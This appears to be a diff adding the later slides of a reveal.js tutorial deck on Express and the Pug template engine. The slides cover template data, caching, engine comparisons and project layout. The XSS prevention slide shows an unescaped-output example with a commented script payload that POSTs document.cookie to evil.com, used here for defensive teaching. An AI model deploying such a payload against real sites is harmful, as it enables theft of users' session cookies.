+        <p>Express resolves <code>res.render('dashboard')</code> to <code>views/dashboard.pug</code> automatically. Subdirectories work too: <code>res.render('admin/users')</code>.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 14 — PASSING DATA TO TEMPLATES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">13</span><h2>Passing Data to Templates</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>res.render() Data Object</h3>
+        <pre><code class="language-javascript">// Route handler
+app.get('/dashboard', async (req, res) =&gt; {
+  const user = await User.findById(req.user.id);
+  const stats = await getStats(user.id);
+
+  res.render('dashboard', {
+    title: 'Dashboard',
+    user,
+    stats,
+    isAdmin: user.role === 'admin',
+    formatDate: (d) =&gt;
+      d.toLocaleDateString('en-GB')
+  });
+});</code></pre>
+      </div>
+      <div class="card green">
+        <h3>res.locals &mdash; Per-Request Data</h3>
+        <pre><code class="language-javascript">// Middleware sets data for all templates
+app.use((req, res, next) =&gt; {
+  res.locals.currentUser = req.user;
+  res.locals.flash = req.flash();
+  next();
+});
+
+// Available in ALL templates for
+// this request — no need to pass
+// explicitly in res.render()</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>app.locals &mdash; Global Data</h3>
+        <pre><code class="language-javascript">// Set once at startup
+app.locals.siteName = 'My App';
+app.locals.version = '2.1.0';
+app.locals.nav = [
+  { href: '/', label: 'Home' },
+  { href: '/about', label: 'About' },
+  { href: '/contact', label: 'Contact' },
+];
+
+// Accessible in every template:
+// h1= siteName
+// span= version</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Data Merge Order</h3>
+        <p>Express merges data in this priority (highest wins):</p>
+        <ol>
+          <li><code>res.render()</code> data object</li>
+          <li><code>res.locals</code></li>
+          <li><code>app.locals</code></li>
+        </ol>
+        <p>This means route-specific data overrides middleware-set data, which overrides global data.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 15 — SECURITY: XSS PREVENTION -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">14</span><h2>Security &mdash; XSS Prevention</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3>The Danger: Cross-Site Scripting</h3>
+        <pre><code class="language-pug">//- VULNERABLE: unescaped user input
+div!= userComment
+
+//- If userComment contains:
+//- &lt;script&gt;fetch('https://evil.com/steal',
+//-   {method:'POST', body:document.cookie})
+//- &lt;/script&gt;
+
+//- SAFE: escaped output (default)
+div= userComment
+p Welcome, #{userComment}</code></pre>
+      </div>
+      <div class="card amber">
+        <h3>Rule of Thumb</h3>
+        <table>
+          <thead><tr><th>Scenario</th><th>Syntax</th></tr></thead>
+          <tbody>
+            <tr><td>User-supplied text</td><td><code>= val</code> or <code>#{val}</code> always</td></tr>
+            <tr><td>Trusted HTML content</td><td><code>!= val</code> or <code>!{val}</code></td></tr>
+            <tr><td>CMS / Markdown HTML</td><td><code>!= val</code> after sanitising</td></tr>
+            <tr><td>JSON in script tag</td><td><code>!= JSON.stringify(data)</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Sanitisation for Rich Content</h3>
+        <pre><code class="language-javascript">const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+// In route handler
+const clean = DOMPurify.sanitize(
+  userHtml,
+  { ALLOWED_TAGS: ['b','i','p','a','ul','li'],
+    ALLOWED_ATTR: ['href'] }
+);
+res.render('post', { content: clean });</code></pre>
+        <pre><code class="language-pug">//- Template — safe after sanitisation
+article!= content</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>Embedding Data in JS Safely</h3>
+        <pre><code class="language-pug">script.
+  // SAFE — JSON.stringify escapes
+  // angle brackets in strings
+  const data = !{JSON.stringify(data)};</code></pre>
+        <p>Avoids string interpolation XSS in inline scripts. Always use <code>JSON.stringify()</code> for embedding data in <code>&lt;script&gt;</code> tags.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 16 — PERFORMANCE & CACHING -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">15</span><h2>Performance &amp; Caching</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>How Pug Compiles Templates</h3>
+        <svg class="diagram" viewBox="0 0 440 100" style="max-width:420px;">
+          <rect x="0" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--amber)" stroke-width="1.5"/>
+          <text x="50" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">.pug file</text>
+          <line x1="100" y1="42" x2="140" y2="42" stroke="var(--muted)" stroke-width="1.5" marker-end="url(#arr)"/>
+          <rect x="140" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--green)" stroke-width="1.5"/>
+          <text x="190" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">JS function</text>
+          <line x1="240" y1="42" x2="280" y2="42" stroke="var(--muted)" stroke-width="1.5" marker-end="url(#arr)"/>
+          <rect x="280" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--blue)" stroke-width="1.5"/>
+          <text x="330" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">HTML string</text>
+          <text x="50" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">lex + parse</text>
+          <text x="190" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">compile (cached)</text>
+          <text x="330" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">execute</text>
+          <defs><marker id="arr" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="var(--muted)"/></marker></defs>
+        </svg>
+        <p>Pug uses a 3-stage pipeline: <span class="a">lexer</span> (tokenise), <span class="g">parser</span> (build AST), <span class="b">code generator</span> (emit JS function). The compiled function is cached and reused.</p>
+      </div>
+      <div class="card green">
+        <h3>Express View Cache</h3>
+        <pre><code class="language-javascript">// Auto-enabled in production
+app.set('view cache', true);
+
+// Or via NODE_ENV
+// NODE_ENV=production node app.js
+// Express enables view cache automatically
+// when NODE_ENV === 'production'</code></pre>
+        <p>In dev, templates are re-read and re-compiled on every request (useful for live editing). In production, they compile once.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Pug Compilation Options</h3>
+        <pre><code class="language-javascript">const pug = require('pug');
+
+// Compile to a reusable function
+const fn = pug.compileFile('tpl.pug', {
+  cache: true,       // enable caching
+  pretty: false      // minified output
+});
+const html = fn(data);
+
+// Precompile for client-side use
+const clientFn = pug.compileFileClient(
+  'tpl.pug',
+  { name: 'myTemplate' }
+);
+// Returns a string of JS code</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Performance Tips</h3>
+        <ul>
+          <li><span class="a">Always</span> enable view cache in production</li>
+          <li>Keep includes small &mdash; each is compiled separately</li>
+          <li>Avoid deeply nested inheritance chains (3+ levels)</li>
+          <li>Move heavy computation to route handlers, not templates</li>
+          <li>Precompile templates at build time for serverless / edge</li>
+          <li>Set <code>pretty: false</code> in production for smaller output</li>
+        </ul>
+      </div>
+      <div class="card red">
+        <h3>Benchmarks (Approximate)</h3>
+        <table>
+          <thead><tr><th>Engine</th><th>Renders/sec</th></tr></thead>
+          <tbody>
+            <tr><td>Pug (cached)</td><td>~22,000</td></tr>
+            <tr><td>EJS (cached)</td><td>~28,000</td></tr>
+            <tr><td>Handlebars (precompiled)</td><td>~35,000</td></tr>
+            <tr><td>Nunjucks (cached)</td><td>~18,000</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 17 — PUG VS OTHER ENGINES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">16</span><h2>Pug vs Other Template Engines</h2></div>
+  <table>
+    <thead>
+      <tr><th>Feature</th><th>Pug</th><th>EJS</th><th>Handlebars</th><th>Nunjucks</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="a">Syntax</span></td>
+        <td>Indentation-based</td>
+        <td>HTML + JS tags</td>
+        <td>Mustache <code>{{ }}</code></td>
+        <td>Jinja2-style <code>{% %}</code></td>
+      </tr>
+      <tr>
+        <td><span class="a">Learning Curve</span></td>
+        <td>Moderate</td>
+        <td><span class="g">Minimal</span></td>
+        <td>Low</td>
+        <td>Low-Moderate</td>
+      </tr>
+      <tr>
+        <td><span class="a">JS in Templates</span></td>
+        <td>Full JS access</td>
+        <td>Full JS access</td>
+        <td><span class="r">No</span> (logic-less)</td>
+        <td>Limited expressions</td>
+      </tr>
+      <tr>
+        <td><span class="a">Layouts</span></td>
+        <td><span class="g">Built-in</span> extends/block</td>
+        <td>Via plugin/includes</td>
+        <td>Via partials</td>
+        <td><span class="g">Built-in</span> extends</td>
+      </tr>
+      <tr>
+        <td><span class="a">Mixins</span></td>
+        <td><span class="g">Built-in</span></td>
+        <td><span class="r">No</span> (use functions)</td>
+        <td>Partials + helpers</td>
+        <td>Macros</td>
+      </tr>
+      <tr>
+        <td><span class="a">Auto-Escape</span></td>
+        <td>Default escaped</td>
+        <td><code>&lt;%= %&gt;</code> escapes</td>
+        <td>Default escaped</td>
+        <td>Default escaped</td>
+      </tr>
+      <tr>
+        <td><span class="a">npm Weekly DLs</span></td>
+        <td>~1.5M</td>
+        <td><span class="g">~4.7M</span></td>
+        <td>~3.2M</td>
+        <td>~0.9M</td>
+      </tr>
+      <tr>
+        <td><span class="a">Best For</span></td>
+        <td>Clean markup fans</td>
+        <td>JS devs, rapid dev</td>
+        <td>Logic separation</td>
+        <td>Python devs, i18n</td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="card amber" style="margin-top:.3em;">
+    <p><span class="a">When to choose Pug:</span> You want concise, indentation-based templates with built-in inheritance, mixins, and filters. When <span class="r">not</span> to choose Pug: Your team prefers plain HTML, you need minimal learning curve, or IDE support is a priority.</p>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 18 — REAL-WORLD PROJECT STRUCTURE -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">17</span><h2>Real-World Express + Pug Project Structure</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber">
+        <h3>Directory Layout</h3>
+        <pre><code class="language-text">my-app/
+├── app.js
+├── package.json
+├── .env
+├── config/
+│   └── db.js
+├── routes/
+│   ├── index.js
+│   ├── auth.js
+│   └── products.js
+├── controllers/
+│   ├── authController.js
+│   └── productController.js
+├── models/
+│   ├── User.js
+│   └── Product.js
+├── middleware/
+│   ├── auth.js
+│   └── validate.js
+├── views/
+│   ├── layout.pug
+│   ├── mixins/
+│   │   ├── card.pug
+│   │   └── form-field.pug
+│   ├── partials/
+│   │   ├── nav.pug
+│   │   ├── flash.pug
+│   │   └── footer.pug
+│   ├── pages/
+│   │   ├── home.pug
+│   │   ├── about.pug
+│   │   └── contact.pug
+│   ├── auth/
+│   │   ├── login.pug
+│   │   └── register.pug
+│   ├── products/
+│   │   ├── index.pug
+│   │   ├── show.pug
+│   │   └── edit.pug
+│   └── error.pug
+└── public/
+    ├── css/
+    │   └── style.css
+    ├── js/
+    │   └── main.js
+    └── images/</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Key Principles</h3>
+        <ul>
+          <li><span class="a">views/layout.pug</span> &mdash; base template with extends/block</li>
+          <li><span class="a">views/mixins/</span> &mdash; reusable components (card, form-field)</li>
+          <li><span class="a">views/partials/</span> &mdash; included fragments (nav, footer, flash)</li>
+          <li><span class="a">views/pages/</span> &mdash; static-ish content pages</li>
+          <li><span class="a">views/{resource}/</span> &mdash; CRUD views per model</li>
+          <li><span class="a">public/</span> &mdash; static assets served by Express</li>
+        </ul>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>app.js Setup</h3>
+        <pre><code class="language-javascript">const express = require('express');
+const path = require('path');
+
+const app = express();
+
+app.set('view engine', 'pug');
+app.set('views',
+  path.join(__dirname, 'views'));
+
+// No layout plugin needed — Pug has
+// built-in extends/block inheritance
+
+app.locals.siteName = 'My App';
+app.locals.basedir =
+  path.join(__dirname, 'views');
+
+app.use(express.static(
+  path.join(__dirname, 'public')
+));
+app.use(express.urlencoded(
+  { extended: true }
+));</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Naming Conventions</h3>
+        <p>Use <code>index.pug</code> for list views, <code>show.pug</code> for detail, <code>edit.pug</code> / <code>new.pug</code> for forms. Store shared mixins in <code>mixins/</code> and include them where needed.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 19 — SUMMARY & NEXT STEPS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">18</span><h2>Summary &amp; Next Steps</h2></div>
+  <div class="cols cols-3">
+    <div class="card amber">
+      <h3>Core Takeaways</h3>
+      <ul>
+        <li>Pug = indentation-based templates, no closing tags</li>
+        <li><code>=</code> / <code>#{}</code> for escaped, <code>!=</code> / <code>!{}</code> for raw</li>
+        <li>Built-in inheritance with <code>extends</code> and <code>block</code></li>
+        <li>Mixins for reusable, parameterised components</li>
+        <li>Auto-escaping prevents XSS by default</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Best Practices</h3>
+      <ul>
+        <li>Always use <code>=</code> / <code>#{}</code> for user data</li>
+        <li>Keep templates thin &mdash; compute in handlers</li>
+        <li>Use mixins for repeated markup patterns</li>
+        <li>Use <code>extends/block</code> for layouts, <code>include</code> for fragments</li>
+        <li>Enable view cache in production</li>
+        <li>Set <code>basedir</code> for absolute include paths</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Next Steps</h3>
+      <ul>
+        <li>Build a CRUD app with Express + Pug</li>
+        <li>Add authentication (Passport.js + Pug forms)</li>
+        <li>Create a mixin library for your UI components</li>
+        <li>Integrate flash messages (<code>connect-flash</code>)</li>
+        <li>Explore filters for Markdown / SCSS embedding</li>
+        <li>Try HTMX + Pug for dynamic partial updates</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cols cols-2" style="margin-top:.4em;">
+    <div class="card blue">
+      <h3>Essential Resources</h3>
+      <ul>
+        <li><span class="a">Official Docs:</span> <span class="mono">pugjs.org</span></li>
+        <li><span class="a">GitHub:</span> <span class="mono">github.com/pugjs/pug</span></li>
+        <li><span class="a">npm:</span> <span class="mono">npmjs.com/package/pug</span></li>
+        <li><span class="a">Express Guide:</span> <span class="mono">expressjs.com/en/guide/using-template-engines.html</span></li>
+      </ul>
+    </div>
+    <div class="card red">
+      <h3>Key Packages</h3>
+      <table>
+        <thead><tr><th>Package</th><th>Purpose</th></tr></thead>
+        <tbody>
+          <tr><td><code>pug</code></td><td>Template engine</td></tr>
+          <tr><td><code>pug-cli</code></td><td>Command-line compiler</td></tr>
+          <tr><td><code>jstransformer-markdown-it</code></td><td>Markdown filter</td></tr>
+          <tr><td><code>dompurify</code> + <code>jsdom</code></td><td>HTML sanitisation</td></tr>
+          <tr><td><code>express-validator</code></td><td>Form validation</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+  </div></div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/monokai.min.css">
+  <script>
+    Reveal.initialize({
+      hash: true, transition: 'fade', transitionSpeed: 'fast',
+      controls: true, progress: true, center: false,
+      width: 1100, height: 900, margin: 0.01,
+      plugins: [RevealHighlight], highlight: { theme: 'monokai' }
+    });
+  </script>
+</body>
+</html>
